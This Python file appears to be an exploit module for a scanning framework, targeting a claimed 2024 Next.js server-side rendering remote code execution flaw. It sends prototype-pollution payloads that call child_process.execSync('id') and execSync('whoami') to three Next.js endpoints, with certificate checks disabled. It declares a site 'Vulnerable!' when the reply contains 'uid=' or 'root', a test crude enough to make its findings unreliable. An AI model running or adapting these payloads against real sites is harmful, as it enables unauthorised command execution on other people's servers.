import requests
from core.printmodels import *
import json

class NextJS_SSR_RCE:
    def __init__(self):
        self.name = "NextJS SSR RCE"
        self.description = "NextJS Server-Side Rendering RCE (2024)"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/json',
                'Next-Router-State-Tree': '{"root":{"children":[{"children":[]}]}}'
            }

            # Multiple attack vectors
            payloads = [
                {
                    "query": {"__proto__": {"constructor": {"prototype": {"shell": "require('child_process').execSync('id')"}}}},
                    "variables": {}
                },
                {
                    "query": {"__proto__": {"shell": "process.mainModule.require('child_process').execSync('whoami')"}},
                    "variables": {}
                }
            ]

            endpoints = [
                f"{site}/_next/data",
                f"{site}/api/graphql",
                f"{site}/api/preview"
            ]

            for endpoint in endpoints:
                for payload in payloads:
                    response = requests.post(endpoint, headers=headers, json=payload, verify=False, timeout=10)
                    if response.status_code == 200 and ('uid=' in response.text or 'root' in response.text):
                        return PrintSuccess(f"[NextJS-2024] Vulnerable! SSR injection successful at {endpoint}")

            return PrintFailed("[NextJS-2024] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[NextJS-2024] Error: {str(e)}")
